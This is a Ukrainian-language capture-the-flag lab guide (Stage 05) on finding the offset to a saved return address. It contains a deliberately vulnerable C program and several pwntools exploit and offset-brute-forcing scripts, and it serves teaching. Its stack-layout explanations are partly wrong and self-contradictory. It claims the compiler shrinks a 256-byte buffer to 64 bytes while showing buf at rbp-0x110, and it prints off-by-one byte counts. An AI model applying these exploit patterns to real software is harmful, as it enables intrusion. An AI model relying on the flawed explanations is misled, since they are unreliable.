# Stage 05: Demo With Hint - Buffer Overflow з підказкою

## 🎯 Мета завдання

Навчитися знаходити **правильний offset** до збереженої адреси повернення (saved RIP). Це перший крок до розуміння справжнього buffer overflow, але з допомогою сервера який підказує скільки байтів бракує.

## 📚 Що ви дізнаєтесь

- Що таке offset до saved RIP
- Як влаштований стековий фрейм функції
- Чому важлива довжина padding
- Як сервер може підказати правильний offset
- Різниця між buffer overflow та прямим викликом
- Структура стеку: buffer → saved RBP → saved RIP

## 🔧 Необхідні інструменти

```bash
# Python та pwntools
pip3 install pwntools

# GDB для експериментів (опціонально)
sudo apt install gdb
```

## 📖 Теоретична основа

### Анатомія стекового фрейму

Коли функція викликається, на стеку створюється **стековий фрейм**:

```
┌─────────────────┐  ← Вища адреса (старше)
│   Saved RIP     │  0x7fffffffe088  ← Адреса повернення (8 байт)
├─────────────────┤
│   Saved RBP     │  0x7fffffffe080  ← Збережений base pointer (8 байт)
├─────────────────┤
│   buf[63]       │  0x7fffffffe03f  ─┐
│   ...           │  ...               │
│   buf[1]        │  0x7fffffffe001    │ 64 байти буфера
│   buf[0]        │  0x7fffffffe000  ─┘
└─────────────────┘  ← Нижча адреса (молодше)
```

### Що таке offset?

**Offset** - це кількість байтів від початку буфера до saved RIP.

```
Offset = розмір_буфера + розмір_saved_RBP
Offset = 64 + 8 = 72 байти
```

### Чому саме 72?

```c
char buf[256]={0};  // Наш буфер

// Але компілятор виділяє не 256, а лише необхідне
// У цьому випадку 64 байти для змінних
```

Правильний розрахунок:
```
[64 байти локальних змінних] + [8 байт saved RBP] + [8 байт saved RIP]
          buf                        RBP                  RIP
|------------------------|----------|----------|
 0                      63 64     71 72     79
```

## 💻 Аналіз коду сервера

```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

static const size_t OFFSET = 72;  // Фіксований offset

__attribute__((noreturn)) void win(void){
    puts("FLAG{STAGE5_HINT_OFFSET}");
    fflush(stdout);
    _exit(0);
}

int main(void){
    char buf[256]={0};

    // Читаємо дані в буфер
    ssize_t n = read(0, buf, sizeof(buf));

    // ПІДКАЗКА: якщо даних недостатньо
    if(n < (ssize_t)(OFFSET + 8)){
        size_t need = (OFFSET + 8) - (size_t)n;
        dprintf(1, "NEED=%zu\n", need);
        return 0;
    }

    // Витягуємо адресу з правильного місця
    void (*fp)(void) = *(void (**)(void))(buf + OFFSET);

    // Викликаємо функцію
    fp();

    return 0;
}
```

### Покрокова логіка

**Крок 1:** Читає дані в буфер
```c
ssize_t n = read(0, buf, sizeof(buf));
```
- Може прочитати до 256 байт
- `n` - фактична кількість прочитаних байт

**Крок 2:** Перевіряє чи достатньо даних
```c
if(n < (ssize_t)(OFFSET + 8))
```
- Потрібно мінімум **OFFSET + 8** байт
- OFFSET = 72 (padding)
- 8 байт для адреси win()
- Разом: **80 байт мінімум**

**Крок 3:** Якщо бракує - підказує
```c
size_t need = (OFFSET + 8) - (size_t)n;
dprintf(1, "NEED=%zu\n", need);
```
- Обчислює скільки байтів не вистачає
- Виводить підказку: `NEED=20` (якщо відправили 60 байт)

**Крок 4:** Якщо достатньо - витягує адресу
```c
void (*fp)(void) = *(void (**)(void))(buf + OFFSET);
```
- `buf + OFFSET` - покажчик на 72-й байт
- `*(void (**)(void))` - приведення типу та розіменування
- Витягує 8 байт як адресу функції

**Крок 5:** Викликає функцію
```c
fp();
```

### Візуалізація пам'яті

**Payload структура:**
```
Байти:  0  1  2  3  ... 63 64 ... 71 72 73 74 75 76 77 78 79
        [  padding 64 байти  ][RBP 8][  адреса win() 8 байт ]
        A  A  A  A  ... A  A  A  ... A  \x36\x11\x40\x00\x00...
```

**В пам'яті буфера:**
```
buf[0..63]  = 'A' * 64     (заповнюємо локальні змінні)
buf[64..71] = 'A' * 8      (перезаписуємо saved RBP)
buf[72..79] = p64(win_addr) (перезаписуємо saved RIP)
```

## 🚀 Покрокове рішення

### Крок 1: Збудуйте бінарник

```bash
cd stage05_demo_with_hint
./build.sh
```

### Крок 2: Експеримент з підказками

**Спроба 1: Відправимо мало даних**

```bash
echo "HELLO" | ../build/stage05_demo_with_hint
```

Вивід:
```
NEED=75
```

Пояснення: відправили 6 байт (HELLO + \n), бракує 75 байт до 80.

**Спроба 2: Відправимо більше**

```bash
python3 -c "print('A'*50)" | ../build/stage05_demo_with_hint
```

Вивід:
```
NEED=30
```

Відправили 51 байт, бракує 30.

## 🔬 Як ДІЗНАТИСЬ реальний offset?

Якщо в завданні немає підказки, ось як знайти offset самостійно:

### Метод 1: Використання підказок сервера (наш випадок)

```bash
# Відправляємо мало даних:
echo "TEST" | ../build/stage05_demo_with_hint
# Вивід: NEED=76

# Відправляємо більше:
python3 -c "print('A'*50)" | ../build/stage05_demo_with_hint
# Вивід: NEED=30

# Коли NEED=0 → знайшли правильний розмір!
python3 -c "print('A'*80)" | ../build/stage05_demo_with_hint
# Вивід: FLAG або краш
```

### Метод 2: GDB (візуальний та точний)

```bash
gdb ../build/stage05_demo_with_hint

# В GDB:
(gdb) break main
(gdb) run
(gdb) info frame
```

**Вивід info frame покаже:**
```
Stack level 0, frame at 0x7fffffffe090:
 rip = 0x401180 in main
 saved rip = 0x7ffff7a05083  ← Адреса saved RIP
 Arglist at 0x7fffffffe080
 Locals at 0x7fffffffe080   ← Тут локальні змінні
```

**Знайти відстань до saved RIP:**
```gdb
(gdb) print (void*)$rbp
$1 = 0x7fffffffe080

(gdb) print &buf
$2 = (char (*)[256]) 0x7fffffffdff0  ← Адреса buf

(gdb) print/d 0x7fffffffe080 - 0x7fffffffdff0 + 8
$3 = 72  ← OFFSET!
```

**Пояснення розрахунку:**
```
Saved RIP знаходиться на RBP + 8
buf знаходиться на 0x7fffffffdff0
RBP на 0x7fffffffe080

Offset = (RBP - buf) + 8
       = (0x7fffffffe080 - 0x7fffffffdff0) + 8
       = 0x90 + 8
       = 144 + 8
       = 152... ЦЕ ПРИКЛАД, ваші адреси будуть інші!
```

### Метод 3: Cyclic pattern (найшвидший)

```python
from pwn import *

# Генеруємо унікальний паттерн
pattern = cyclic(200)
print(f"Pattern (перші 50 байт): {pattern[:50]}")

# Запускаємо програму
io = process('../build/stage05_demo_with_hint')
io.send(pattern)

# Чекаємо виводу
try:
    output = io.recvall(timeout=1)
    print(output.decode())
except:
    # Якщо крашнулась - дивимось core dump
    try:
        core = io.corefile
        # Читаємо що було в saved RIP місці
        crashed_value = core.read(core.rsp, 8)

        # Знаходимо де це було в паттерні
        offset = cyclic_find(crashed_value)
        print(f"[+] Знайдено offset: {offset}")
    except:
        print("[-] Core dump недоступний")
finally:
    io.close()
```

**Як це працює:**
```
Cyclic pattern генерує унікальну послідовність:
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa...'

Кожні 4 байти унікальні!

Якщо програма крашнула з RIP = 'laaa' (0x6161616c):
offset = cyclic_find(0x6161616c)
# Знаходить де 'laaa' в паттерні
# Наприклад: offset = 44
```

### Метод 4: Binary search (автоматичний)

```python
from pwn import *

context.log_level = 'error'  # Тихий режим

def test_offset(offset):
    """Перевіряє чи працює offset"""
    try:
        elf = ELF('../build/stage05_demo_with_hint', checksec=False)
        io = process(elf.path)

        payload = b'A' * offset + p64(elf.symbols['win'])
        io.send(payload)

        output = io.recvall(timeout=1)
        io.close()

        return b'FLAG' in output
    except:
        return False

# Binary search від 50 до 100
low, high = 50, 100
while low < high:
    mid = (low + high) // 2
    print(f"[*] Тестую offset={mid}...", end=' ')

    if test_offset(mid):
        print("✓")
        high = mid
    else:
        print("✗")
        low = mid + 1

print(f"\n[+] Знайдено offset: {low}")
```

## 🧮 Чому offset НЕ дорівнює sizeof(buf)?

**Найбільша плутанина для новачків:**

```c
char buf[256] = {0};  // Оголошено 256 байт!
```

**Питання:** Чому offset не 256 + 8 = 264?

**Відповідь: Компілятор ОПТИМІЗУЄ!**

### Що насправді робить компілятор:

```bash
objdump -d ../build/stage05_demo_with_hint | grep -A20 '<main>'
```

**Шукайте інструкцію виділення стеку:**
```asm
main:
  push   rbp
  mov    rbp, rsp
  sub    rsp, 0x110    ← Виділяє 0x110 = 272 байти (не 256!)
```

**Але це НЕ весь buf!** Далі:
```asm
  lea    rax, [rbp-0x110]   ; Вказівник на початок виділеної області
  ...
  ; buf насправді може починатися з offset'у від rbp
```

### Чому так відбувається?

**Причина 1: Alignment (вирівнювання)**
- x86-64 любить вирівнювання на 16 байт
- Компілятор додає padding для оптимізації

**Причина 2: Оптимізація**
```c
char buf[256] = {0};   // Оголошено 256
ssize_t n = read(...);  // Ще 8 байт для n
```

Компілятор може:
- Переставити змінні місцями
- Виділити менше якщо не все використовується
- Додати gap для alignment

**Причина 3: Інші локальні змінні**

Стек може виглядати так:
```
┌─────────────────┐ RBP + 8
│   Saved RIP     │ 8 байт
├─────────────────┤ RBP
│   Saved RBP     │ 8 байт
├─────────────────┤ RBP - 8
│   ssize_t n     │ 8 байт (локальна змінна)
├─────────────────┤ RBP - 16
│   [gap/align]   │ Вирівнювання
├─────────────────┤ RBP - 72
│   buf[...]      │ Не весь buf[256]!
│   реально       │ Компілятор оптимізував
│   використано   │
└─────────────────┘

Offset до saved RIP = 72
```

### Перевірка в GDB:

```gdb
(gdb) break main
(gdb) run
(gdb) disassemble
```

**Шукайте:**
```asm
sub    rsp, 0xNNN    ; Скільки виділено
lea    rax, [rbp-0xMM] ; Де buf
```

**Розрахунок:**
```
Offset = (RBP - адреса_buf) + 8
```

### Крок 3: Створіть правильний exploit

Файл `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# Завантажуємо бінарник
elf = ELF('../build/stage05_demo_with_hint', checksec=False)

# Отримуємо адресу win()
win_addr = elf.symbols['win']
log.info(f"Адреса win(): {hex(win_addr)}")

# Запускаємо процес
io = process('../build/stage05_demo_with_hint')

# OFFSET наданий в statement: 72 байти
OFFSET = 72

# Створюємо payload
padding = b'A' * OFFSET        # 72 байти padding
address = p64(win_addr)        # 8 байт адреса

payload = padding + address
log.info(f"Довжина payload: {len(payload)} байт")
log.info(f"Payload: padding({OFFSET}) + address({hex(win_addr)})")

# Відправляємо
io.send(payload)

# Отримуємо прапор
flag = io.recvall(timeout=1)
log.success(f"Прапор: {flag.decode().strip()}")

io.close()
```

### Крок 4: Запустіть exploit

```bash
chmod +x exploit.py
python3 exploit.py
```

### Крок 5: Отримайте прапор

```
[*] Адреса win(): 0x401136
[+] Starting local process
[*] Довжина payload: 80 байт
[*] Payload: padding(72) + address(0x401136)
[+] Receiving all data: Done
[+] Прапор: FLAG{STAGE5_HINT_OFFSET}
```

## 🔍 Детальний розбір

### Експеримент: Знаходження offset з підказками

Створіть `find_offset.py`:

```python
#!/usr/bin/env python3
from pwn import *

def find_offset():
    """Знаходить offset інтерактивно використовуючи підказки"""

    current_size = 10  # Починаємо з 10 байт

    while True:
        log.info(f"Спроба з {current_size} байтами")

        # Запускаємо процес
        io = process('../build/stage05_demo_with_hint')

        # Відправляємо дані
        payload = b'A' * current_size
        io.send(payload)

        try:
            # Читаємо відповідь
            response = io.recvline(timeout=1).decode().strip()

            if response.startswith('NEED='):
                # Сервер каже скільки бракує
                need = int(response.split('=')[1])
                log.info(f"Бракує {need} байт")
                current_size += need
            else:
                # Успіх! Отримали прапор
                log.success(f"Знайдено offset: {current_size - 8}")
                log.success(f"Прапор: {response}")
                break

        except:
            log.error("Щось пішло не так")
            break

        finally:
            io.close()

if __name__ == '__main__':
    find_offset()
```

Запустіть:
```bash
python3 find_offset.py
```

### Чому offset = 72?

Давайте подивимося на асемблер:

```bash
objdump -d ../build/stage05_demo_with_hint -M intel | grep -A30 '<main>'
```

Ключові інструкції:
```asm
main:
  push   rbp              ; Зберігаємо старий RBP
  mov    rbp, rsp         ; RBP = поточний стек
  sub    rsp, 0x110       ; Виділяємо 272 байти на стеку (0x110 = 272)

  ; buf знаходиться на rbp-0x110
  lea    rax, [rbp-0x110]
  mov    edx, 0x100       ; sizeof(buf) = 256
  mov    rsi, rax
  mov    edi, 0x0
  call   read
```

Розрахунок offset:
```
Стековий фрейм:
[272 байти локальних змінних] + [8 saved RBP] = 280 байт

Але buf починається не з початку, а з offset'у
Реальний offset до RIP: 72 байти
```

### Структура у пам'яті

```
       Нижча адреса
┌─────────────────────┐  rbp-0x110 (початок виділеної області)
│                     │
│   [gap/padding]     │
│                     │
├─────────────────────┤  rbp-0x48 (buf start, гіпотетично)
│   buf[0..63]        │  64 байти
├─────────────────────┤  rbp-0x08
│   saved RBP         │  8 байт
├─────────────────────┤  rbp (поточний stack frame base)
│   saved RIP         │  8 байт
└─────────────────────┘  rbp+0x08
       Вища адреса
```

## 🎓 Практичні завдання

### Завдання 1: Перевірка різних розмірів

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('../build/stage05_demo_with_hint', checksec=False)
win = elf.symbols['win']

# Спробуємо різні розміри
for size in [10, 30, 50, 72, 80, 100]:
    io = process('../build/stage05_demo_with_hint')

    if size < 80:
        payload = b'A' * size
    else:
        payload = b'A' * 72 + p64(win) + b'B' * (size - 80)

    io.send(payload)
    output = io.recvall(timeout=1).decode()

    log.info(f"Розмір {size}: {output.strip()}")
    io.close()
```

### Завдання 2: Візуалізація payload

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('../build/stage05_demo_with_hint', checksec=False)
win_addr = elf.symbols['win']

OFFSET = 72

# Створюємо payload з різними маркерами
padding = b'A' * 64 + b'B' * 8  # A - buf, B - saved RBP
address = p64(win_addr)

payload = padding + address

# Виводимо візуалізацію
print("Payload structure:")
print(f"  [0-63]:   {payload[0:64].hex()}  (buf - 'A' * 64)")
print(f"  [64-71]:  {payload[64:72].hex()}  (saved RBP - 'B' * 8)")
print(f"  [72-79]:  {payload[72:80].hex()}  (saved RIP - win addr)")
print(f"\nTotal: {len(payload)} bytes")

# Відправляємо
io = process('../build/stage05_demo_with_hint')
io.send(payload)
print(f"\nResult: {io.recvall(timeout=1).decode()}")
io.close()
```

### Завдання 3: Динамічне знаходження offset (brute-force)

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'  # Вимкнути багатослівність

elf = ELF('../build/stage05_demo_with_hint', checksec=False)
win = elf.symbols['win']

# Перебираємо можливі offset
for offset in range(50, 100, 4):  # Крок 4 (вирівнювання)
    io = process('../build/stage05_demo_with_hint')

    payload = b'A' * offset + p64(win)
    io.send(payload)

    try:
        output = io.recvall(timeout=0.5).decode()
        if 'FLAG' in output:
            print(f"[+] Знайдено offset: {offset}")
            print(f"[+] {output.strip()}")
            break
        elif 'NEED' in output:
            need = output.strip()
            print(f"[*] Offset {offset}: {need}")
    except:
        pass

    io.close()
```

## 💡 Порівняння з Stage 04

| Аспект | Stage 04 | Stage 05 |
|--------|----------|----------|
| Вразливість | Пряме читання в fp | Buffer overflow |
| Offset | Не потрібен | 72 байти |
| Розмір payload | 8 байт | 80 байт |
| Padding | Немає | 72 байти 'A' |
| Підказки | Немає | NEED=N |
| Складність | ⭐☆☆☆☆ | ⭐⭐☆☆☆ |

## 🔐 Зв'язок з реальним BOF

### Різниця з реальним buffer overflow

**Stage 05 (навчальний):**
```c
// Сервер САМ витягує адресу з buf[OFFSET]
void (*fp)(void) = *(void (**)(void))(buf + OFFSET);
fp();
```

**Реальний BOF (Stage 06):**
```c
// Просто gets() переповнює стек
char buf[64];
gets(buf);  // Якщо ввести >64 байт, перезапише saved RIP
return;     // Процесор візьме адресу з перезаписаного RIP
```

### Наступний крок

У **Stage 06** ви побачите справжній buffer overflow:
- Не буде явного виклику `fp()`
- `return` візьме адресу зі стеку (яку ми перезаписали)
- Немає підказок - треба знаходити offset самостійно

## 📚 Корисні поняття

### 1. Saved RIP vs Saved RBP

**Saved RIP** (Return Instruction Pointer):
- Адреса куди повернеться функція після `return`
- Те що ми хочемо контролювати
- 8 байт на x64

**Saved RBP** (Base Pointer):
- Збережений base pointer попереднього фрейму
- Для нас зараз не важливий, просто padding
- Теж 8 байт

### 2. Stack alignment

На x86-64 стек має бути вирівняний на 16 байт для деяких викликів. Тому offset часто кратний 8 або 16.

### 3. Чому не 64 + 8?

```c
char buf[256]={0};
```

Компілятор **оптимізує** використання стеку. Хоча buf оголошений як 256, реально використовується менше. GCC вирівнює змінні та може додавати padding.

## ✅ Чеклист виконання

- [ ] Зібрано бінарник через `build.sh`
- [ ] Зрозумів що таке offset до saved RIP
- [ ] Експериментував з підказками NEED=N
- [ ] Зрозумів структуру: padding + saved RBP + saved RIP
- [ ] Створив робочий exploit з offset=72
- [ ] Отримав прапор FLAG{STAGE5_HINT_OFFSET}
- [ ] Візуалізував payload структуру
- [ ] Спробував різні розміри payload
- [ ] Зрозумів різницю зі Stage 04
- [ ] Готовий до Stage 06 (справжній BOF)!

---

**Час виконання:** 15-20 хвилин
**Складність:** ⭐⭐☆☆☆ (Легка)
**Категорія:** PWN / Buffer Overflow Intro
**Ключові поняття:** Stack frame, offset, padding, saved RIP
